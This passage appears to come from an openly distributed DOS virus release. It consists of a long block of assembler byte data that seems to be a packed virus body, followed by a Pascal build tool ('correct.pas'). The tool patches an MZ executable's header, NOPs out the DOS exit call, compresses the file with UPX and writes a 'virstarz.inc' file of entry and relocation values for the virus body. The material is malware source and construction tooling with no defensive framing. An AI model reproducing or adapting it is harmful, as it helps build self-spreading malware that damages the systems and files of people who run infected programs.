   db  0FAh,075h,006h,035h,090h,0B7h,081h,0FFh,0A4h,084h,027h,0D8h,04Ah,028h
   db  0DCh,0C0h,0E9h,006h,05Ah,004h,0DDh,002h,07Eh,008h,0BFh,053h,00Ah,047h
   db  0E8h,0BDh,0FDh,0EDh,08Bh,0C7h,0C4h,00Bh,000h,0B0h,04Bh,0AAh,0B2h,02Dh
   db  006h,033h,00Fh,061h,00Bh,0AAh,026h,07Dh,0E0h,0F2h,0E3h,005h,0D0h,02Ch
   db  0C3h,0ECh,027h,03Ah,05Ah,05Ah,005h,016h,05Ah,0FFh,0E7h,042h,08Dh,029h
   db  01Fh,070h,07Eh,005h,02Fh,005h,0DDh,0FDh,058h,073h,0EDh,09Dh,06Fh,076h
   db  04Ch,0F7h,046h,0E8h,01Dh,0FEh,043h,0ACh,047h,00Bh,05Dh,02Fh,016h,025h
   db  05Eh,0A0h,0E0h,005h,07Fh,0B6h,03Dh,03Fh,0EBh,017h,08Eh,000h,03Ch,081h
   db  0BAh,059h,052h,0B7h,033h,008h,0CBh,0B0h,01Ah,03Ch,0B3h,09Ah,0FDh,003h
   db  034h,050h,063h,004h,04Ch,028h,0DEh,0B3h,080h,07Dh,030h,001h,0E1h,07Ch
   db  01Eh,08Dh,055h,030h,05Ah,0ACh,094h,041h,00Dh,0FFh,073h,086h,006h,082h
   db  0E9h,0EBh,011h,092h,0C9h,0DAh,033h,081h,043h,050h,0CBh,0E2h,082h,0DEh
   db  0A0h,093h,04Dh,003h,0DCh,069h,075h,00Eh,06Dh,092h,069h,070h,073h,0E9h
   db  0B2h,069h,037h,01Bh,0CBh,01Ch,017h,048h,06Eh,033h,009h,0B1h,01Eh,059h
   db  015h,0A7h,0DBh,067h,088h,006h,059h,040h,0D6h,0C3h,000h,0EDh,0BAh,064h
   db  06Bh,0B5h,005h,046h,01Ch,023h,0C4h,0B1h,02Ch,078h,0DCh,06Fh,044h,01Bh
   db  01Eh,052h,043h,054h,02Ch,023h,014h,074h,070h,01Fh,01Ah,0F1h,083h,029h
   db  05Bh,087h,0C2h,070h,049h,07Eh,095h,0B3h,03Fh,0B9h,0FEh,035h,0B3h,040h
   db  0B9h,041h,0E5h,010h,0E8h,0A6h,0B6h,03Fh,0A7h,00Ah,01Bh,052h,01Ch,01Eh
   db  0F4h,051h,026h,0F7h,065h,06Dh,08Bh,0C8h,0A1h,042h,0D3h,06Ch,0E3h,040h
   db  065h,059h,06Dh,0DAh,0D2h,0BAh,015h,075h,004h,0E4h,0CAh,0B6h,0C8h,00Bh
   db  07Fh,0DDh,005h,0D6h,0EBh,0DBh,01Ch,03Bh,030h,074h,089h,017h,03Ah,05Eh
   db  0EDh,0E6h,059h,01Bh,048h,01Eh,018h,005h,0DBh,067h,00Eh,091h,00Eh,04Ah
   db  05Ah,021h,03Dh,0D8h,08Bh,055h,008h,067h,006h,04Ah,0C2h,085h,026h,070h
   db  05Bh,05Bh,06Bh,042h,0E1h,037h,097h,056h,008h,08Bh,02Bh,038h,07Fh,004h
   db  083h,0C2h,030h,0B4h,041h,00Eh,048h,013h,018h,00Eh,0D5h,08Ch,065h,099h
   db  006h,030h,090h,0CBh,02Dh,0B6h,0B9h,00Ah,040h,0D8h,026h,0B4h,056h,079h
   db  08Ch,005h,0E1h,014h,09Eh,068h,076h,0E7h,081h,08Ch,009h,09Ch,068h,030h
   db  0DAh,0A2h,0AAh,01Ah,0ECh,0FAh,087h,0D5h,077h,073h,080h,03Eh,0DEh,007h
   db  094h,07Fh,01Bh,066h,0C1h,0E0h,010h,066h,00Fh,0EDh,0ACh,0D0h,010h,008h
   db  09Eh,0E1h,0D9h,05Dh,0F7h,0E9h,0BFh,007h,0A4h,0C2h,010h,0CBh,08Bh,0EAh
   db  0F0h,08Bh,0FAh,050h,09Eh,0A8h,0F1h,051h,0ADh,00Bh,012h,0D8h,01Ah,0B3h
   db  0D6h,00Bh,0C5h,085h,0F7h,0FBh,003h,0D3h,003h,0D1h,0CBh,03Ch,039h,027h
   db  02Bh,0F6h,074h,05Eh,066h,099h,040h,0E8h,0F9h,066h,0D6h,05Dh,043h,02Eh
   db  048h,096h,0CBh,055h,085h,0C2h,06Fh,0B4h,079h,008h,045h,006h,0FCh,088h
   db  05Fh,051h,0F7h,0DAh,00Bh,0DBh,0FBh,074h,03Eh,079h,00Bh,045h,00Eh,079h
   db  0D9h,083h,0D3h,05Bh,00Ch,033h,06Fh,0E4h,0F1h,08Bh,0FBh,016h,0D7h,0C3h
   db  08Bh,01Ah,005h,042h,083h,0BDh,04Fh,07Eh,0D1h,0E0h,0D1h,0D2h,0D1h,0DFh
   db  000h,0D3h,040h,02Bh,0CEh,0DBh,01Bh,0DFh,0C8h,048h,0FFh,003h,0CEh,013h
   db  0DFh,04Dh,075h,0E9h,05Dh,0E8h,0EBh,016h,05Dh,06Fh,009h,0E9h,0F3h,0F6h
   db  0E3h,0FDh,0F7h,093h,092h,0F7h,0F1h,093h,0AEh,002h,032h,0B7h,0D3h,038h
   db  0D1h,0EDh,0D8h,073h,008h,04Ch,036h,045h,027h,0D8h,007h,066h,036h,05Dh
   db  0A5h,00Bh,09Ch,0B6h,0E2h,010h,059h,0F1h,066h,0D3h,0EAh,0ADh,007h,00Ah
   db  0B7h,0EAh,08Eh,083h,0E1h,08Dh,01Fh,047h,0FDh,0D1h,0EAh,0D1h,0D8h,0E2h
   db  0FAh,091h,022h,0C8h,0E2h,04Bh,086h,09Dh,022h,0FCh,00Ah,09Dh,0B5h,0A2h
   db  021h,05Ah,085h,042h,00Bh,075h,032h,041h,0D0h,08Bh,0DAh,0CCh,09Fh,019h
   db  0DBh,015h,00Ah,076h,01Dh,006h,036h,006h,05Ah,00Bh,096h,0C1h,052h,087h
   db  0A9h,03Ah,099h,023h,020h,0D6h,08Eh,03Dh,01Ch,00Ch,0D8h,008h,08Ah,0B9h
   db  0CBh,0DFh,027h,006h,00Bh,0C9h,07Fh,003h,0A5h,0B9h,06Ah,0C0h,003h,0F1h
   db  0BDh,085h,072h,013h,040h,0EDh,039h,011h,01Ah,0DEh,096h,018h,03Bh,0D5h
   db  03Eh,0B8h,025h,0C1h,0EBh,03Ah,067h,0AAh,015h,06Ah,0E1h,040h,0A7h,098h
   db  07Eh,04Ah,0DBh,00Dh,00Dh,059h,07Dh,0ACh,026h,000h,005h,0A2h,0F0h,016h
   db  07Dh,0FFh,0DFh,06Ah,0F6h,0D0h,003h,0F9h,0B5h,047h,06Eh,09Ah,090h,0B3h
   db  055h,0E3h,076h,00Ah,0FCh,015h,0E8h,02Ch,05Ch,00Eh,032h,0F6h,04Eh,081h
   db  0FFh,032h,02Bh,0CAh,072h,01Ch,0EAh,041h,047h,0ACh,05Ch,0DCh,075h,015h
   db  02Eh,0C7h,08Bh,0D9h,016h,036h,049h,0A6h,0FCh,080h,00Eh,050h,076h,0ADh
   db  0E4h,02Eh,0EDh,046h,0EBh,0E6h,070h,042h,066h,0E3h,048h,02Bh,0A1h,054h
   db  0CCh,087h,071h,037h,0AEh,027h,096h,082h,0ACh,057h,01Eh,060h,06Eh,03Ah
   db  0CCh,0D8h,0E1h,0CCh,00Ah,0C9h,015h,05Dh,0D9h,0A6h,0F6h,075h,002h,03Ah
   db  0C4h,09Ch,01Bh,0FBh,0C4h,0BCh,0EDh,0AAh,036h,08Ah,05Bh,06Fh,0AAh,047h
   db  0DBh,030h,0AEh,0E6h,00Ah,08Bh,006h,084h,0D8h,0C9h,077h,006h,09Dh,0A0h
   db  055h,0B6h,02Bh,079h,093h,07Dh,001h,07Dh,005h,0C7h,0A1h,06Ch,000h,045h
   db  022h,0DCh,03Ah,09Dh,006h,02Bh,05Eh,0D3h,022h,051h,048h,0DBh,05Eh,0CBh
   db  0FEh,011h,06Bh,00Eh,066h,0F7h,003h,0FFh,020h,048h,0FEh,030h,0FFh,0A8h
   db  01Ah,0E7h,0FFh,01Eh,071h,0ACh,0FEh,00Eh,01Ah,0C7h,0C1h,013h,0B7h,008h
   db  00Bh,078h,0FEh,01Fh,0D0h,00Ch,060h,05Eh,03Dh,000h,07Eh,05Ch,0B2h,005h
   db  008h,0E5h,056h,081h,06Eh,032h,07Fh,04Fh,0D9h,006h,006h,06Fh,07Eh,072h
   db  092h,0FFh,0B9h,008h,0F6h,058h,0FEh,069h,002h,0EBh,013h,003h,02Ah,06Ch
   db  050h,06Dh,0E6h,03Eh,093h,07Bh,067h,010h,009h,07Ah,06Eh,043h,0B3h,00Ah
   db  01Fh,017h,0B4h,089h,00Dh,04Bh,0CCh,03Dh,016h,0E6h,07Fh,00Dh,0B0h,002h
   db  0FFh,005h,059h,0A8h,0F0h,002h,0B4h,03Ch,023h,020h,009h,003h,01Fh,00Bh
   db  03Ah,0ABh,05Ah,018h,050h,0BAh,0C1h,004h,0BAh,015h,0C4h,04Eh,0C0h,0CEh
   db  02Ch,02Fh,0BEh,005h,044h,05Fh,0F6h,0C2h,080h,0B8h,0BDh,060h,01Ah,017h
   db  039h,06Ch,075h,014h,03Eh,041h,0D5h,0ECh,02Bh,02Dh,07Eh,03Bh,086h,030h
   db  006h,004h,006h,079h,081h,049h,068h,014h,05Fh,076h,016h,089h,04Dh,018h
   db  0EDh,089h,05Dh,01Ah,010h,0EDh,01Ch,080h,004h,004h,0B8h,01Eh,01Eh,058h
   db  0ACh,0ADh,028h,06Ah,026h,0E9h,054h,002h,0A8h,02Dh,0DEh,03Ch,083h,0DAh
   db  000h,025h,0DCh,06Bh,018h,014h,053h,051h,0ACh,06Bh,01Dh,08Dh,095h,0B6h
   db  017h,0B9h,002h,0A1h,03Ah,038h,073h,0E6h,061h,055h,0E8h,03Bh,0D8h,0DBh
   db  0EEh,080h,013h,0ABh,01Ah,041h,054h,0B4h,072h,0F2h,0A0h,048h,0DAh,05Fh
   db  0B9h,0B5h,087h,082h,045h,0F0h,04Eh,03Fh,0A3h,0C3h,0E8h,044h,046h,0ADh
   db  0C0h,00Fh,0FCh,051h,083h,0F9h,001h,02Bh,0FCh,034h,042h,000h,0EEh,002h
   db  0FCh,070h,013h,0A6h,00Dh,0B9h,040h,0B6h,027h,0D3h,01Ah,013h,0E7h,09Eh
   db  0FBh,012h,05Ah,00Bh,08Eh,0E6h,0C6h,072h,005h,017h,0B9h,00Fh,068h,09Ah
   db  010h,0E3h,0D1h,0EFh,00Dh,0DCh,0BAh,02Bh,0D3h,0D2h,007h,004h,09Bh,001h
   db  052h,050h,061h,00Dh,0BDh,077h,05Ah,0FAh,0D7h,00Fh,054h,0B3h,0B4h,040h
   db  0A0h,07Bh,04Dh,0EFh,0FAh,0CCh,0F9h,0C3h,00Eh,05Ah,0F1h,007h,0B9h,02Ah
   db  004h,06Eh,0BDh,0D1h,0E9h,0D1h,011h,06Eh,0AEh,0ABh,0C3h,003h,031h,003h
   db  0D4h,073h,05Bh,063h,047h,05Dh,052h,0D9h,0FAh,06Eh,030h,03Dh,072h,096h
   db  0F3h,020h,0A3h,062h,025h,0DEh,012h,031h,03Dh,04Fh,04Eh,0A5h,0DAh,0FFh
   db  03Ah,04Ah,04Fh,049h,04Eh,03Ah,023h,03Ah,0FAh,07Bh,020h,02Fh,069h,066h
   db  097h,0EDh,020h,024h,0FEh,06Eh,069h,063h,06Bh,020h,03Dh,03Dh,0D5h,008h
   db  072h,01Fh,095h,0FAh,0BCh,016h,068h,061h,06Ch,02Dh,016h,07Dh,0D6h,02Fh
   db  032h,013h,0FFh,02Fh,064h,063h,063h,020h,073h,065h,056h,002h,0B3h,026h
   db  061h,04Fh,07Bh,033h,03Dh,025h,0ADh,01Dh,002h,0FFh,05Bh,066h,069h,06Ch
   db  065h,073h,065h,072h,095h,076h,0DDh,079h,057h,061h,072h,0BBh,02Ah,06Eh
   db  067h,06Bh,075h,066h,066h,073h,060h,000h,029h,0E4h,0FFh,0FFh,000h,020h
   db  0F6h,010h,040h,003h,0D4h,0A0h,0C2h,050h,095h,01Fh,02Bh,05Ah,04Fh,00Bh
   db  0A8h,013h,05Bh,008h,00Dh,013h,06Ch,000h,000h,000h,026h,001h,04Fh,0EDh
   db  001h,0F2h,01Ch,001h,0F7h,001h,01Eh,0D7h,01Bh,00Dh,079h,0E0h,001h,0A9h
   db  000h,000h,000h,000h,000h,000h,090h,0FFh,0A4h,000h,0FFh,075h,003h,0E8h
   db  05Dh,000h,072h,0F6h,041h,08Ch,0C0h,0E8h,048h,000h,0E3h,059h,073h,0F9h
   db  049h,049h,074h,00Ch,0C1h,0E1h,004h,089h,0CDh,08Ah,01Ch,046h,0F6h,0D3h
   db  031h,0C9h,0E8h,031h,000h,011h,0C9h,075h,008h,041h,0E8h,029h,000h,073h
   db  0FBh,041h,041h,081h,0FDh,0D1h,000h,083h,0D9h,0FEh,029h,0E8h,072h,00Eh
   db  08Eh,0D8h,08Dh,001h,028h,0FCh,096h,0F3h,0A4h,096h,08Eh,0DAh,0EBh,0B5h
   db  0C1h,0E0h,004h,06Ah,000h,01Fh,001h,0D8h,001h,0F8h,0EBh,0EAh,000h,0FFh
   db  075h,003h,0E8h,006h,000h,011h,0C9h,000h,0FFh,075h,005h,08Ah,03Ch,046h
   db  010h,0FFh,0C3h,05Dh,006h,01Fh,08Dh,0B5h,057h,0FFh,0ADh,05Bh,091h,0ADh
   db  092h,0ADh,097h,0ADh,001h,0C3h,08Eh,0C3h,031h,0C0h,001h,0C7h,026h,001h
   db  02Dh,0ACh,048h,074h,015h,040h,075h,0F4h,047h,047h,026h,080h,03Dh,09Ah
   db  075h,0F9h,026h,039h,055h,003h,077h,0F3h,0B0h,003h,0EBh,0E2h,081h,0C7h
   db  0FEh,000h,0E2h,0E1h,007h,006h,01Fh,0EAh,0C6h,006h,000h,000h,034h,004h
   db  034h,0A4h,032h

   --[correct.pas]--------------------------------------------------------------->8

   {$M $4000,65535,65535 }

   Uses Dos;

   type
         mz_hdr = record
           Signature:   Word;
           ExtraBytes:  Word;
           Pages:       Word;
           RelocItems:  Word;
           HeaderSize:  Word;
           MinAlloc:    Word;
           MaxAlloc:    Word;
           InitSS:      Word;
           InitSp:      Word;
           CheckSum:    Word;
           InitIP:      Word;
           InitCS:      Word;
           RelocTable:  Word;
           Overlay:     Word;
           Reserved:    LongInt;
   end;

   var
           mz: mz_hdr;
           f:  file;
           p:  pointer;
           size,sizex,sizen,n,nu: word;
           t: text;

   begin
           writeln('-----------------------------------------');
           Writeln('Correct exit code');
           assign(f, paramstr(1));
           reset(f, 1);
           blockread(f, Addr(mz)^, sizeof(mz));
           if mz.Signature <> $5A4D then
              begin
                   writeln('!"');
                   halt(1);
              end;
           mz.InitSP := $FFFE;
           mz.InitCS := 0;
           Seek(f, 0);
           BlockWrite(f, Addr(mz)^, sizeof(mz));
           Seek(F, mz.HeaderSize*16);
           size := FileSize(f)-mz.HeaderSize*16;
           nu := size;
           getmem(p, size);
           blockread(f, p^, size);
           asm
                  push ds
                  mov  cx, size
                  lds  si, p
              @@0:lodsb
                  cmp  al, 0B4h
                  jnz  @@1
                  cmp  byte ptr [si+0], 4Ch
                  jnz  @@1
                  cmp  byte ptr [si+1], 0CDh
                  jnz  @@1
                  cmp  byte ptr [si+2], 21h
                  jnz  @@1
                  mov  byte ptr [si+2], 90h
              @@1:
                  loop @@0
                  pop  ds
           end;
           Seek(F, mz.HeaderSize*16);
           blockwrite(f, p^, size);
           freemem(p, size);
           Close(f);
           SwapVectors;
           Exec(GetEnv('COMSPEC'),'/C UPX --best '+ParamStr(1));
           SwapVectors;
           Reset(f, 1);
           writeln('Only one reloc. ;)))');
           blockread(f, Addr(mz)^, sizeof(mz));
           Seek(F, mz.HeaderSize*16);
           size := FileSize(f)-mz.HeaderSize*16;
           GetMem(p, size);
           BlockRead(f, p^, size);
           Seek(f, mz.RelocTable);
           BlockRead(f, n, 2);      { ofs }
           BlockRead(f, sizen, 2);  { seg }
           Writeln('Reloc addres: ',Sizen,':',n);
           sizen := (sizen*16)+n;
           Seek(f, 0);
           BlockWrite(f, p^, size);
           Truncate(f);
           FreeMem(p, size);
           SIzeX := FileSize(f);
           Close(f);
           Assign(T, 'virstarz.inc');
           RewRite(T);
           Writeln(T, 'Start_IP = ',mz.InitIP);
           Writeln(T, 'Start_CS = ',mz.InitCS);
           Writeln(T, 'Body_Len = ',sizex);
           Writeln(T, 'RelocOfs = ',sizen);
           Writeln(T, 'Start_SP = ',mz.InitSP);
           Writeln(T, 'Start_SS = ',mz.InitSS);
           Writeln(T, 'RealBody = ',nu);
           Close(T);
           writeln('-----------------------------------------');
   end.
